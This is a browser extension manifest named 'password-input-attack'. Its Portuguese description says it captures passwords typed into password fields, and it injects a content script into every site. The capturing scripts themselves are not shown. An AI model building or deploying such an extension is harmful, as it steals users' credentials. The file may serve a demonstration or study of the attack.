{
  "manifest_version": 3,
  "name": "password-input-attack",
  "version": "1.0",
  "description": "Captura a senha digitada em um input type password",
  "permissions": ["scripting", "activeTab"],
  "background": {
      "service_worker": "background.js"
  },
  "content_scripts": [
      {
          "matches": ["<all_urls>"],
          "js": ["content.js"]
      }
  ]
}
